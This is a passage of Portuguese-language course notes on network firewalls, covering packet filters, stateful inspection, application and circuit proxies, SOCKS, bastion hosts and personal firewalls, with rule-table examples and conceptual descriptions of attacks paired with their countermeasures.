id="_1-6-tipo-1-firewall-de-filtragem-de-pacotes" tabindex="-1"><span class="cut mono-3 wght-1 slnt-2 step-3">1</span><span class="cut mono-4 wght-3 slnt-0 step-2">.</span><span class="cut mono-1 wght-0 slnt-1 step-1">6</span> <span class="cut mono-0 wght-3 slnt-5 step-2">T</span><span class="cut mono-3 wght-2 slnt-2 step-1">i</span><span class="cut mono-5 wght-1 slnt-0 step-0">p</span><span class="cut mono-5 wght-1 slnt-3 step-0">o</span> <span class="cut mono-1 wght-1 slnt-0 step-2">1</span><span class="cut mono-3 wght-3 slnt-2 step-3">:</span> <span class="cut mono-2 wght-5 slnt-0 step-0">f</span><span class="cut mono-5 wght-1 slnt-2 step-3">i</span><span class="cut mono-5 wght-3 slnt-3 step-0">r</span><span class="cut mono-2 wght-5 slnt-4 step-3">e</span><span class="cut mono-1 wght-2 slnt-5 step-1">w</span><span class="cut mono-3 wght-5 slnt-0 step-1">a</span><span class="cut mono-4 wght-4 slnt-5 step-2">l</span><span class="cut mono-3 wght-3 slnt-3 step-0">l</span> <span class="cut mono-1 wght-4 slnt-4 step-0">d</span><span class="cut mono-4 wght-1 slnt-2 step-2">e</span> <span class="cut mono-2 wght-2 slnt-4 step-2">f</span><span class="cut mono-1 wght-2 slnt-0 step-1">i</span><span class="cut mono-4 wght-0 slnt-3 step-1">l</span><span class="cut mono-5 wght-2 slnt-1 step-1">t</span><span class="cut mono-4 wght-3 slnt-2 step-3">r</span><span class="cut mono-4 wght-4 slnt-2 step-0">a</span><span class="cut mono-5 wght-0 slnt-1 step-1">g</span><span class="cut mono-0 wght-2 slnt-3 step-2">e</span><span class="cut mono-5 wght-5 slnt-1 step-1">m</span> <span class="cut mono-5 wght-0 slnt-1 step-1">d</span><span class="cut mono-0 wght-0 slnt-3 step-2">e</span> <span class="cut mono-1 wght-3 slnt-5 step-2">p</span><span class="cut mono-3 wght-0 slnt-5 step-1">a</span><span class="cut mono-5 wght-4 slnt-2 step-2">c</span><span class="cut mono-2 wght-3 slnt-3 step-3">o</span><span class="cut mono-5 wght-0 slnt-1 step-2">t</span><span class="cut mono-1 wght-5 slnt-1 step-2">e</span><span class="cut mono-3 wght-2 slnt-2 step-0">s</span> <a class="header-anchor" href="#_1-6-tipo-1-firewall-de-filtragem-de-pacotes" aria-hidden="true">#</a></h3><p><strong>Definição (slide 465):</strong> aplica um conjunto de regras a cada pacote IP, de entrada e de saída, e o encaminha ou descarta. As regras usam informação das camadas 3 e 4:</p><ol><li>Endereço IP de origem.</li><li>Endereço IP de destino.</li><li>Porta de origem e de destino (TCP ou UDP), que identifica a aplicação (SNMP, HTTP).</li><li>Campo de protocolo IP: o protocolo de transporte (TCP, UDP, ICMP).</li><li>Interface: em firewalls com três ou mais portas, de qual interface o pacote veio ou para qual vai.</li></ol><p><strong>Tabela 9.1, o exemplo SMTP (slides 467 e 468).</strong> Objetivo: permitir e-mail de entrada e de saída (SMTP, porta 25), bloquear todo o resto.</p><div class="table-wrapper"><table><thead><tr><th>Regra</th><th>Sentido</th><th>End. origem</th><th>End. destino</th><th>Protocolo</th><th>Porta destino</th><th>Ação</th></tr></thead><tbody><tr><td>1</td><td>Entrada</td><td>Externo</td><td>Interno</td><td>TCP</td><td>25</td><td>Permit</td></tr><tr><td>2</td><td>Saída</td><td>Interno</td><td>Externo</td><td>TCP</td><td>&gt; 1023</td><td>Permit</td></tr><tr><td>3</td><td>Saída</td><td>Interno</td><td>Externo</td><td>TCP</td><td>25</td><td>Permit</td></tr><tr><td>4</td><td>Entrada</td><td>Externo</td><td>Interno</td><td>TCP</td><td>&gt; 1023</td><td>Permit</td></tr><tr><td>5</td><td>Ambos</td><td>Qualquer</td><td>Qualquer</td><td>Qualquer</td><td>Qualquer</td><td>Deny</td></tr></tbody></table></div><p>A regra 1 permite correio de entrada, a regra 2 a resposta a ele, a regra 3 correio de saída, a regra 4 a resposta a ele. A regra 5 é a política padrão, sempre a última, explícita ou implícita.</p><p><strong>A falha:</strong> a regra 4 é permissiva demais. Ela permite tráfego externo para <strong>qualquer</strong> porta de destino acima de 1023, supondo que é uma resposta.</p><p><strong>A exploração (slide 469):</strong> um atacante externo abre uma conexão da porta 5150 para um proxy web interno na porta 8080. A regra 4 permite, porque 8080 está acima de 1023.</p><p><strong>Primeiro refinamento:</strong> acrescentar a <strong>porta de origem</strong> às regras. As regras 2 e 4 (respostas) recebem porta de origem 25, porque a resposta a um e-mail vem da porta 25 do servidor. As regras 1 e 3 (novas conexões) recebem porta de origem &gt; 1023, porque um cliente que inicia uma conexão de correio usa uma porta alta.</p><p><strong>A vulnerabilidade restante (slide 470):</strong> a porta 25 para SMTP é só um padrão. Um atacante externo pode rodar outra aplicação na porta 25 e enviar pacotes <strong>da porta de origem 25</strong> para máquinas internas. A regra 4 revisada os aceita como respostas.</p><p><strong>A solução: o flag ACK (slides 471 e 472).</strong> A regra 4 também exige o flag ACK ligado. Um pacote que pertence a uma conexão TCP estabelecida, como uma resposta SMTP legítima, sempre tem ACK ligado. Um pacote que inicia uma nova conexão tem SYN e não tem ACK.</p><div class="table-wrapper"><table><thead><tr><th>Regra</th><th>Sentido</th><th>End. origem</th><th>Porta origem</th><th>End. destino</th><th>Protocolo</th><th>Porta destino</th><th>Flag</th><th>Ação</th></tr></thead><tbody><tr><td>4</td><td>Entrada</td><td>Externo</td><td>25</td><td>Interno</td><td>TCP</td><td>&gt; 1023</td><td>ACK</td><td>Permit</td></tr></tbody></table></div><p><strong>Três vantagens (slide 473):</strong> simplicidade (lógica de regras sobre cabeçalhos L3 e L4), transparência (nenhuma configuração no cliente), velocidade (sem inspeção da carga útil).</p><p><strong>Cinco fraquezas, NIST SP 800-41 (slides 474 e 475):</strong></p><ol><li><strong>Sem dados das camadas superiores.</strong> Não impede ataques que usam vulnerabilidades específicas da aplicação. Se a aplicação é permitida, todas as suas funções são permitidas.</li><li><strong>Registro limitado.</strong> O log guarda só o que foi usado na decisão: endereços e tipo de tráfego.</li><li><strong>Sem autenticação avançada de usuário.</strong> Mesma causa: sem funcionalidade das camadas superiores.</li><li><strong>Vulnerável a ataques na pilha TCP/IP</strong>, como falsificação de endereço na camada de rede. Muitos filtros não detectam endereçamento alterado na camada 3.</li><li><strong>Sujeito a erro de configuração.</strong> Poucas variáveis na decisão tornam fácil permitir tráfego que deveria ser negado.</li></ol><p><strong>Dois ataques e suas contramedidas (slides 476 e 477):</strong></p><ul><li><strong>Falsificação de endereço IP.</strong> O intruso envia pacotes de fora com o endereço de origem de um host interno confiável, para penetrar sistemas que confiam em endereços internos. Contramedida: descartar qualquer pacote que chega na interface externa com endereço de origem interno.</li><li><strong>Ataque de fragmento minúsculo.</strong> O intruso usa a fragmentação IP para empurrar o cabeçalho TCP, com as portas, para um segundo fragmento. O primeiro fragmento contém só o cabeçalho IP. O filtro decide pelo primeiro fragmento, e o atacante espera que o resto passe. Contramedida: exigir uma quantidade mínima do cabeçalho de transporte no primeiro fragmento. Se o primeiro fragmento é rejeitado, lembrar o ID do pacote e descartar os fragmentos seguintes.</li></ul><p><strong>O problema de raiz: falta de contexto (slide 478).</strong> Um filtro sem estado decide pacote a pacote e ignora se uma conexão TCP existe. Um servidor usa uma porta bem conhecida fixa abaixo de 1024 (SMTP: 25). Um cliente usa uma porta temporária dinâmica acima de 1024 (por exemplo 49152). Para permitir a resposta da porta 25 para a porta 49152, o filtro precisa abrir <strong>todas</strong> as portas altas (&gt; 1023) na entrada. Isso é uma vulnerabilidade enorme.</p><h3 id="_1-7-tipo-2-firewall-de-inspecao-com-estado" tabindex="-1"><span class="cut mono-1 wght-1 slnt-0 step-2">1</span><span class="cut mono-5 wght-2 slnt-2 step-3">.</span><span class="cut mono-4 wght-0 slnt-0 step-3">7</span> <span class="cut mono-2 wght-4 slnt-5 step-1">T</span><span class="cut mono-4 wght-5 slnt-4 step-1">i</span><span class="cut mono-1 wght-2 slnt-5 step-1">p</span><span class="cut mono-2 wght-1 slnt-2 step-0">o</span> <span class="cut mono-3 wght-0 slnt-2 step-2">2</span><span class="cut mono-2 wght-1 slnt-4 step-2">:</span> <span class="cut mono-1 wght-1 slnt-2 step-2">f</span><span class="cut mono-3 wght-2 slnt-2 step-3">i</span><span class="cut mono-5 wght-2 slnt-4 step-3">r</span><span class="cut mono-3 wght-0 slnt-4 step-1">e</span><span class="cut mono-5 wght-3 slnt-5 step-1">w</span><span class="cut mono-2 wght-4 slnt-2 step-1">a</span><span class="cut mono-0 wght-5 slnt-0 step-2">l</span><span class="cut mono-3 wght-1 slnt-1 step-0">l</span> <span class="cut mono-0 wght-4 slnt-1 step-0">d</span><span class="cut mono-3 wght-2 slnt-3 step-3">e</span> <span class="cut mono-5 wght-0 slnt-1 step-3">i</span><span class="cut mono-5 wght-1 slnt-1 step-0">n</span><span class="cut mono-0 wght-5 slnt-5 step-3">s</span><span class="cut mono-2 wght-1 slnt-3 step-2">p</span><span class="cut mono-2 wght-2 slnt-0 step-2">e</span><span class="cut mono-4 wght-2 slnt-5 step-2">ç</span><span class="cut mono-0 wght-5 slnt-2 step-2">ã</span><span class="cut mono-3 wght-2 slnt-0 step-3">o</span> <span class="cut mono-2 wght-1 slnt-0 step-0">c</span><span class="cut mono-4 wght-0 slnt-5 step-0">o</span><span class="cut mono-2 wght-5 slnt-4 step-3">m</span> <span class="cut mono-3 wght-3 slnt-2 step-3">e</span><span class="cut mono-2 wght-4 slnt-1 step-0">s</span><span class="cut mono-4 wght-0 slnt-4 step-0">t</span><span class="cut mono-2 wght-1 slnt-1 step-3">a</span><span class="cut mono-2 wght-0 slnt-2 step-1">d</span><span class="cut mono-0 wght-4 slnt-4 step-3">o</span> <a class="header-anchor" href="#_1-7-tipo-2-firewall-de-inspecao-com-estado" aria-hidden="true">#</a></h3><p><strong>A solução (slide 479):</strong> apertar as regras para o tráfego TCP. O firewall cria e mantém uma <strong>tabela de estado</strong> (Tabela 9.2) das conexões TCP de saída que estão ativas, uma entrada por conexão estabelecida. Tráfego de entrada para portas altas é permitido <strong>só</strong> se o pacote corresponde a uma das entradas.</p><p>Tabela 9.2, linhas de exemplo (slide 481):</p><div class="table-wrapper"><table><thead><tr><th>Endereço de origem</th><th>Porta de origem</th><th>Endereço de destino</th><th>Porta de destino</th><th>Estado</th></tr></thead><tbody><tr><td>192.168.1.100</td><td>1030</td><td>210.9.88.29</td><td>80</td><td>Estabelecida</td></tr><tr><td>192.168.1.101</td><td>1033</td><td>173.66.32.122</td><td>25</td><td>Estabelecida</td></tr><tr><td>192.168.1.106</td><td>1035</td><td>177.231.32.12</td><td>79</td><td>Estabelecida</td></tr><tr><td>223.43.21.231</td><td>1990</td><td>192.168.1.6</td><td>80</td><td>Estabelecida</td></tr></tbody></table></div><p><strong>Capacidades (slide 480):</strong> revisa os mesmos cabeçalhos L3 e L4 que um filtro de pacotes, <strong>e</strong> registra o estado da conexão TCP (estabelecida, encerrando). Recursos avançados em alguns produtos: <strong>rastreamento do número de sequência TCP</strong>, contra ataques como sequestro de sessão; <strong>inspeção limitada de aplicação (DPI)</strong>, útil para protocolos problemáticos (FTP, IM, SIPS) para identificar e rastrear conexões de dados relacionadas.</p><h3 id="_1-8-tipo-3-proxy-de-aplicacao-application-level-gateway" tabindex="-1"><span class="cut mono-1 wght-0 slnt-3 step-3">1</span><span class="cut mono-0 wght-3 slnt-4 step-1">.</span><span class="cut mono-2 wght-2 slnt-0 step-1">8</span> <span class="cut mono-0 wght-5 slnt-4 step-0">T</span><span class="cut mono-2 wght-0 slnt-4 step-2">i</span><span class="cut mono-5 wght-4 slnt-2 step-1">p</span><span class="cut mono-1 wght-4 slnt-1 step-3">o</span> <span class="cut mono-3 wght-1 slnt-2 step-1">3</span><span class="cut mono-2 wght-4 slnt-1 step-2">:</span> <span class="cut mono-0 wght-4 slnt-3 step-1">p</span><span class="cut mono-4 wght-3 slnt-3 step-3">r</span><span class="cut mono-5 wght-3 slnt-1 step-3">o</span><span class="cut mono-5 wght-2 slnt-4 step-3">x</span><span class="cut mono-2 wght-0 slnt-3 step-0">y</span> <span class="cut mono-2 wght-1 slnt-2 step-3">d</span><span class="cut mono-0 wght-2 slnt-5 step-1">e</span> <span class="cut mono-4 wght-3 slnt-5 step-1">a</span><span class="cut mono-0 wght-4 slnt-0 step-2">p</span><span class="cut mono-5 wght-2 slnt-5 step-2">l</span><span class="cut mono-3 wght-0 slnt-2 step-0">i</span><span class="cut mono-3 wght-1 slnt-4 step-1">c</span><span class="cut mono-2 wght-4 slnt-3 step-2">a</span><span class="cut mono-2 wght-4 slnt-4 step-0">ç</span><span class="cut mono-5 wght-1 slnt-4 step-3">ã</span><span class="cut mono-2 wght-0 slnt-0 step-0">o</span> <span class="cut mono-2 wght-4 slnt-3 step-1">(</span><span class="cut mono-3 wght-2 slnt-3 step-2">a</span><span class="cut mono-2 wght-5 slnt-4 step-1">p</span><span class="cut mono-3 wght-4 slnt-2 step-3">p</span><span class="cut mono-0 wght-1 slnt-2 step-2">l</span><span class="cut mono-1 wght-4 slnt-0 step-0">i</span><span class="cut mono-2 wght-0 slnt-1 step-2">c</span><span class="cut mono-3 wght-3 slnt-2 step-1">a</span><span class="cut mono-1 wght-4 slnt-5 step-3">t</span><span class="cut mono-2 wght-2 slnt-5 step-2">i</span><span class="cut mono-5 wght-0 slnt-4 step-0">o</span><span class="cut mono-4 wght-5 slnt-5 step-1">n</span><span class="cut mono-0 wght-3 slnt-5 step-1">-</span><span class="cut mono-3 wght-4 slnt-1 step-3">l</span><span class="cut mono-0 wght-1 slnt-0 step-0">e</span><span class="cut mono-2 wght-4 slnt-5 step-1">v</span><span class="cut mono-1 wght-4 slnt-3 step-1">e</span><span class="cut mono-2 wght-5 slnt-4 step-0">l</span> <span class="cut mono-2 wght-3 slnt-5 step-0">g</span><span class="cut mono-1 wght-4 slnt-5 step-0">a</span><span class="cut mono-5 wght-3 slnt-4 step-0">t</span><span class="cut mono-2 wght-0 slnt-5 step-1">e</span><span class="cut mono-4 wght-0 slnt-3 step-2">w</span><span class="cut mono-4 wght-1 slnt-1 step-2">a</span><span class="cut mono-2 wght-2 slnt-3 step-0">y</span><span class="cut mono-4 wght-0 slnt-3 step-0">)</span> <a class="header-anchor" href="#_1-8-tipo-3-proxy-de-aplicacao-application-level-gateway" aria-hidden="true">#</a></h3><p><strong>Mecanismo (slide 482):</strong> um retransmissor de tráfego de nível de aplicação (Telnet, FTP). O usuário contata o gateway. O gateway pede o host remoto e as credenciais. Se válidas, o próprio gateway contata a aplicação no host remoto e retransmite os segmentos TCP entre os dois extremos. Existem duas conexões <strong>emendadas</strong>: cliente ao gateway, e gateway ao servidor. Não há conexão fim a fim.</p><p><strong>Propriedades (slide 483):</strong></p><ul><li><strong>Controle granular.</strong> Se o gateway não tem código de proxy para uma aplicação, o serviço não é suportado. Ele pode suportar só recursos específicos de uma aplicação, por exemplo permitir HTTP GET e negar POST.</li><li><strong>Mais seguro que filtros de pacotes.</strong> Analisa umas poucas aplicações permitidas em vez de incontáveis combinações de IP, porta e flags.</li><li><strong>Auditoria.</strong> Fácil registrar e auditar todo o tráfego no nível de aplicação.</li><li><strong>Desvantagem: sobrecarga de processamento.</strong> Examina e encaminha todo o tráfego nas duas conexões emendadas.</li></ul><h3 id="_1-9-tipo-4-proxy-de-circuito-circuit-level-gateway-e-socks" tabindex="-1"><span class="cut mono-4 wght-1 slnt-1 step-1">1</span><span class="cut mono-1 wght-1 slnt-3 step-2">.</span><span class="cut mono-0 wght-5 slnt-1 step-3">9</span> <span class="cut mono-2 wght-5 slnt-0 step-3">T</span><span class="cut mono-0 wght-3 slnt-1 step-0">i</span><span class="cut mono-4 wght-4 slnt-5 step-1">p</span><span class="cut mono-3 wght-3 slnt-4 step-1">o</span> <span class="cut mono-4 wght-2 slnt-1 step-2">4</span><span class="cut mono-0 wght-2 slnt-2 step-1">:</span> <span class="cut mono-0 wght-4 slnt-2 step-0">p</span><span class="cut mono-3 wght-0 slnt-2 step-2">r</span><span class="cut mono-5 wght-1 slnt-2 step-2">o</span><span class="cut mono-5 wght-1 slnt-0 step-3">x</span><span class="cut mono-3 wght-0 slnt-2 step-3">y</span> <span class="cut mono-4 wght-5 slnt-5 step-1">d</span><span class="cut mono-4 wght-1 slnt-3 step-0">e</span> <span class="cut mono-4 wght-5 slnt-2 step-2">c</span><span class="cut mono-2 wght-4 slnt-5 step-2">i</span><span class="cut mono-1 wght-3 slnt-3 step-0">r</span><span class="cut mono-0 wght-1 slnt-0 step-1">c</span><span class="cut mono-2 wght-1 slnt-2 step-2">u</span><span class="cut mono-5 wght-4 slnt-5 step-2">i</span><span class="cut mono-1 wght-1 slnt-5 step-0">t</span><span class="cut mono-5 wght-4 slnt-5 step-1">o</span> <span class="cut mono-4 wght-1 slnt-5 step-2">(</span><span class="cut mono-1 wght-2 slnt-0 step-1">c</span><span class="cut mono-3 wght-3 slnt-2 step-3">i</span><span class="cut mono-1 wght-0 slnt-4 step-0">r</span><span class="cut mono-1 wght-5 slnt-3 step-2">c</span><span class="cut mono-1 wght-0 slnt-4 step-0">u</span><span class="cut mono-3 wght-4 slnt-2 step-3">i</span><span class="cut mono-2 wght-3 slnt-1 step-0">t</span><span class="cut mono-5 wght-1 slnt-2 step-3">-</span><span class="cut mono-4 wght-3 slnt-3 step-0">l</span><span class="cut mono-5 wght-2 slnt-0 step-0">e</span><span class="cut mono-5 wght-3 slnt-4 step-0">v</span><span class="cut mono-3 wght-5 slnt-2 step-1">e</span><span class="cut mono-4 wght-2 slnt-3 step-3">l</span> <span class="cut mono-3 wght-3 slnt-0 step-0">g</span><span class="cut mono-5 wght-0 slnt-5 step-0">a</span><span class="cut mono-5 wght-2 slnt-5 step-2">t</span><span class="cut mono-0 wght-1 slnt-1 step-0">e</span><span class="cut mono-4 wght-5 slnt-1 step-2">w</span><span class="cut mono-4 wght-2 slnt-5 step-2">a</span><span class="cut mono-5 wght-2 slnt-4 step-3">y</span><span class="cut mono-4 wght-3 slnt-0 step-3">)</span> <span class="cut mono-1 wght-4 slnt-1 step-0">e</span> <span class="cut mono-0 wght-5 slnt-1 step-2">S</span><span class="cut mono-3 wght-4 slnt-4 step-0">O</span><span class="cut mono-5 wght-3 slnt-2 step-1">C</span><span class="cut mono-3 wght-3 slnt-0 step-2">K</span><span class="cut mono-0 wght-0 slnt-0 step-0">S</span> <a class="header-anchor" href="#_1-9-tipo-4-proxy-de-circuito-circuit-level-gateway-e-socks" aria-hidden="true">#</a></h3><p><strong>Mecanismo (slide 484):</strong> um sistema autônomo ou uma função especializada de um proxy de aplicação. Não permite uma conexão TCP fim a fim. Estabelece duas conexões TCP: host interno ao gateway, e gateway ao host externo. <strong>Diferença principal:</strong> uma vez que as conexões existem, ele retransmite segmentos TCP <strong>sem examinar a carga útil</strong>. A função de segurança é só decidir quais conexões são permitidas.</p><p><strong>Uso híbrido típico:</strong> quando o administrador confia nos usuários internos. A entrada usa um proxy de aplicação (caro, seguro). A saída usa um proxy de circuito (barato), porque examinar os dados de saída não compensa o processamento.</p><p><strong>SOCKS versão 5, RFC 1928 (slides 485 e 486):</strong> um arcabouço para aplicações cliente-servidor (TCP e UDP) usarem os serviços de um firewall de forma conveniente e segura. É uma <strong>camada intermediária</strong> entre a camada de aplicação e a camada de transporte. Não é um gateway de camada de rede, então não encaminha ICMP.</p><p>Componentes: o <strong>servidor SOCKS</strong> no firewall (UNIX, Windows), a <strong>biblioteca cliente SOCKS</strong> nos hosts internos protegidos, e <strong>clientes &quot;SOCKS-ificados&quot;</strong> (FTP, Telnet) recompilados ou religados com a biblioteca.</p><p>Fluxo TCP:</p><ol><li>O cliente interno abre uma conexão TCP com o servidor SOCKS na <strong>porta 1080</strong>.</li><li>O cliente negocia o método de autenticação.</li><li>O cliente se autentica.</li><li>O cliente envia uma requisição de retransmissão (&quot;conectar ao IP 1.2.3.4, porta 80&quot;).</li><li>O servidor SOCKS avalia a requisição e, se permitida, abre a conexão externa.</li></ol><p>UDP: uma conexão TCP com a porta 1080 é aberta primeiro, só para autenticar o usuário. Os segmentos UDP são então retransmitidos enquanto essa conexão de controle fica aberta.</p><h3 id="_1-10-os-quatro-tipos-comparados" tabindex="-1"><span class="cut mono-0 wght-5 slnt-1 step-0">1</span><span class="cut mono-0 wght-5 slnt-5 step-0">.</span><span class="cut mono-0 wght-1 slnt-3 step-3">1</span><span class="cut mono-4 wght-3 slnt-4 step-1">0</span> <span class="cut mono-3 wght-1 slnt-2 step-1">O</span><span class="cut mono-5 wght-1 slnt-3 step-0">s</span> <span class="cut mono-3 wght-2 slnt-1 step-3">q</span><span class="cut mono-4 wght-0 slnt-2 step-0">u</span><span class="cut mono-2 wght-2 slnt-5 step-1">a</span><span class="cut mono-0 wght-4 slnt-3 step-2">t</span><span class="cut mono-5 wght-1 slnt-5 step-1">r</span><span class="cut mono-4 wght-5 slnt-5 step-2">o</span> <span class="cut mono-2 wght-0 slnt-2 step-0">t</span><span class="cut mono-4 wght-3 slnt-3 step-0">i</span><span class="cut mono-1 wght-2 slnt-0 step-1">p</span><span class="cut mono-4 wght-2 slnt-4 step-0">o</span><span class="cut mono-0 wght-4 slnt-2 step-3">s</span> <span class="cut mono-3 wght-1 slnt-1 step-3">c</span><span class="cut mono-3 wght-5 slnt-5 step-3">o</span><span class="cut mono-3 wght-2 slnt-4 step-0">m</span><span class="cut mono-4 wght-2 slnt-1 step-0">p</span><span class="cut mono-1 wght-1 slnt-2 step-1">a</span><span class="cut mono-5 wght-1 slnt-4 step-3">r</span><span class="cut mono-0 wght-1 slnt-4 step-3">a</span><span class="cut mono-5 wght-5 slnt-4 step-3">d</span><span class="cut mono-4 wght-3 slnt-1 step-0">o</span><span class="cut mono-4 wght-4 slnt-2 step-2">s</span> <a class="header-anchor" href="#_1-10-os-quatro-tipos-comparados" aria-hidden="true">#</a></h3><div class="table-wrapper"><table><thead><tr><th>Tipo</th><th>Camada</th><th>Examina</th><th>Estado</th><th>Carga útil</th><th>Custo</th></tr></thead><tbody><tr><td>Filtro de pacotes (sem estado)</td><td>L3, L4</td><td>Cabeçalhos de cada pacote</td><td>Não</td><td>Não</td><td>O menor</td></tr><tr><td>Inspeção com estado</td><td>L3, L4</td><td>Cabeçalhos mais o estado da conexão</td><td>Sim</td><td>Limitada</td><td>Baixo</td></tr><tr><td>Proxy de circuito</td><td>Transporte</td><td>Quais conexões são permitidas</td><td>Sim</td><td>Não</td><td>Médio</td></tr><tr><td>Proxy de aplicação</td><td>Aplicação</td><td>Comandos e conteúdo da aplicação</td><td>Sim</td><td>Sim</td><td>O maior</td></tr></tbody></table></div><h3 id="_1-11-base-do-firewall-host-bastiao-e-outras-plataformas" tabindex="-1"><span class="cut mono-1 wght-0 slnt-4 step-3">1</span><span class="cut mono-0 wght-3 slnt-0 step-1">.</span><span class="cut mono-3 wght-5 slnt-5 step-1">1</span><span class="cut mono-2 wght-5 slnt-5 step-1">1</span> <span class="cut mono-0 wght-0 slnt-2 step-0">B</span><span class="cut mono-2 wght-5 slnt-0 step-0">a</span><span class="cut mono-3 wght-0 slnt-2 step-0">s</span><span class="cut mono-1 wght-0 slnt-4 step-2">e</span> <span class="cut mono-5 wght-3 slnt-2 step-3">d</span><span class="cut mono-3 wght-0 slnt-1 step-3">o</span> <span class="cut mono-2 wght-4 slnt-5 step-1">f</span><span class="cut mono-1 wght-0 slnt-5 step-1">i</span><span class="cut mono-2 wght-0 slnt-2 step-1">r</span><span class="cut mono-2 wght-5 slnt-5 step-2">e</span><span class="cut mono-2 wght-2 slnt-0 step-3">w</span><span class="cut mono-0 wght-1 slnt-4 step-2">a</span><span class="cut mono-5 wght-1 slnt-0 step-0">l</span><span class="cut mono-3 wght-3 slnt-0 step-3">l</span><span class="cut mono-5 wght-0 slnt-3 step-0">:</span> <span class="cut mono-2 wght-3 slnt-4 step-0">h</span><span class="cut mono-5 wght-5 slnt-3 step-1">o</span><span class="cut mono-5 wght-4 slnt-0 step-0">s</span><span class="cut mono-5 wght-2 slnt-2 step-1">t</span> <span class="cut mono-3 wght-3 slnt-1 step-3">b</span><span class="cut mono-3 wght-5 slnt-1 step-0">a</span><span class="cut mono-5 wght-1 slnt-0 step-0">s</span><span class="cut mono-4 wght-2 slnt-4 step-2">t</span><span class="cut mono-0 wght-0 slnt-5 step-2">i</span><span class="cut mono-0 wght-3 slnt-1 step-1">ã</span><span class="cut mono-4 wght-2 slnt-3 step-0">o</span> <span class="cut mono-5 wght-4 slnt-2 step-1">e</span> <span class="cut mono-4 wght-0 slnt-2 step-2">o</span><span class="cut mono-5 wght-3 slnt-1 step-2">u</span><span class="cut mono-3 wght-4 slnt-5 step-0">t</span><span class="cut mono-1 wght-3 slnt-0 step-2">r</span><span class="cut mono-1 wght-4 slnt-3 step-0">a</span><span class="cut mono-1 wght-5 slnt-0 step-1">s</span> <span class="cut mono-1 wght-5 slnt-2 step-2">p</span><span class="cut mono-5 wght-2 slnt-4 step-0">l</span><span class="cut mono-2 wght-3 slnt-1 step-0">a</span><span class="cut mono-0 wght-4 slnt-5 step-1">t</span><span class="cut mono-3 wght-0 slnt-5 step-2">a</span><span class="cut mono-5 wght-0 slnt-5 step-0">f</span><span class="cut mono-2 wght-1 slnt-4 step-2">o</span><span class="cut mono-5 wght-4 slnt-4 step-3">r</span><span class="cut mono-0 wght-3 slnt-2 step-3">m</span><span class="cut mono-5 wght-2 slnt-0 step-2">a</span><span class="cut mono-0 wght-4 slnt-0 step-1">s</span> <a class="header-anchor" href="#_1-11-base-do-firewall-host-bastiao-e-outras-plataformas" aria-hidden="true">#</a></h3><p><strong>Plataformas (slide 487):</strong> uma máquina dedicada autônoma com um SO comum (UNIX, Linux), ou um appliance de segurança pré-configurado. Alternativas: um módulo de software em um roteador, um switch de LAN ou um servidor.</p><p><strong>Host bastião (slide 488):</strong> um sistema identificado pelo administrador do firewall como um <strong>ponto forte crítico</strong> da segurança da rede. Serve como plataforma para proxies de aplicação ou de circuito, e pode suportar outros serviços (IPsec). Seu hardware roda uma versão segura do seu SO: um <strong>sistema reforçado</strong>.</p><p><strong>Características (slides 489 a 492):</strong></p><ol><li><strong>Serviços mínimos:</strong> só os serviços que o administrador considera essenciais são instalados, por exemplo proxies para DNS, FTP, HTTP e SMTP.</li><li><strong>Autenticação extra:</strong> o host pode exigir autenticação antes dos proxies, e cada proxy pode exigir a sua própria.</li><li><strong>Subconjunto de comandos:</strong> cada proxy suporta só um subconjunto dos comandos da aplicação.</li><li><strong>Hosts restritos:</strong> cada proxy permite acesso só a hosts internos específicos.</li><li><strong>Registro detalhado:</strong> cada proxy registra todo o tráfego, cada conexão e sua duração. Uma ferramenta essencial para descobrir e deter ataques.</li><li><strong>Software pequeno:</strong> cada proxy é um pacote muito pequeno projetado para segurança. Uma aplicação de correio UNIX tem mais de 20.000 linhas; um proxy de correio tem menos de 1.000. Mais fácil de auditar.</li><li><strong>Independência:</strong> os proxies são independentes. Um vulnerável é desinstalado sem afetar os outros. Um novo serviço é um novo proxy.</li><li><strong>Sem acesso a disco:</strong> um proxy lê só seu arquivo de configuração inicial. As partes executáveis do sistema de arquivos podem ser somente leitura, o que dificulta cavalos de Troia e sniffers.</li><li><strong>Sem privilégios:</strong> cada proxy roda como usuário sem privilégios em um diretório privado seguro.</li></ol><p><strong>Firewalls baseados em host (slide 493):</strong> um módulo de software que protege um host, no SO ou como complemento, comumente em um servidor. Três vantagens: regras ajustadas ao host; proteção independente da topologia (ataques internos e externos passam pelo firewall do host); uma camada adicional, assim novos servidores entram na rede sem mudar o firewall de rede.</p><p><strong>Firewalls em dispositivos de rede (slide 494):</strong> filtragem de pacotes e inspeção com estado em roteadores e switches, como camadas adicionais junto com hosts bastião e firewalls de host.</p><p><strong>Firewalls virtuais (slide 495):</strong> em ambientes virtualizados, ou um appliance virtual (um host bastião como VM) ou capacidades de firewall no hipervisor.</p><p><strong>Firewalls pessoais (slides 497 a 500):</strong> controlam o tráfego entre um computador pessoal e a rede, em casa ou em intranets corporativas. Implementados como módulo de software no PC, ou no roteador doméstico conectado ao modem DSL ou a cabo. Muito mais simples que firewalls de servidor ou autônomos. Função principal: negar acesso remoto não autorizado. Função secundária: monitorar a atividade de saída para detectar malware como worms. Implementações: <strong>netfilter</strong> (Linux), <strong>pf</strong> (BSD e macOS), <strong>Windows Firewall</strong>. Configurados por CLI ou GUI.</p><p>Política padrão: conexões de entrada negadas, exceto as que o usuário permite; saída permitida. Serviços que podem ser reabilitados, com portas: SSH 22, FTP 20 e 21, compartilhamento Windows 139, SMB sem NetBIOS 445, VNC 5900 a 5902, Network Time 123, compartilhamento de impressora 631 e 515, compartilhamento web pessoal 80 e 427, CVS 2401, IRC 194.</p><p><strong>A regra do FTP:</strong> habilitar FTP abre as portas 20 e 21 localmente. Se outros conectam a partir das portas 20 ou 21, as portas 1024 a 65535 abrem para a conexão de dados do FTP.</p><p><strong>Recursos avançados:</strong> <strong>modo furtivo</strong> (descarta pacotes não solicitados para o sistema parecer ausente), <strong>bloqueio de UDP</strong> (só TCP para portas abertas), <strong>registro</strong>, <strong>filtro de aplicação</strong> (só aplicações selecionadas, ou aplicações assinadas por uma CA válida, podem fornecer serviços).</p><h3 id="_1-12-localizacoes-dmz-vpn-e-firewalls-distribuidos" tabindex="-1"><span class="cut mono-3 wght-0 slnt-0 step-1">1</span><span class="cut mono-2 wght-3 slnt-4 step-2">.</span><span class="cut mono-2 wght-5 slnt-3 step-3">1</span><span class="cut mono-2 wght-1 slnt-1 step-3">2</span> <span class="cut mono-5 wght-3 slnt-1 step-2">L</span><span class="cut mono-3 wght-2 slnt-0 step-2">o</span><span class="cut mono-0 wght-4 slnt-3 step-0">c</span><span class="cut mono-0 wght-1 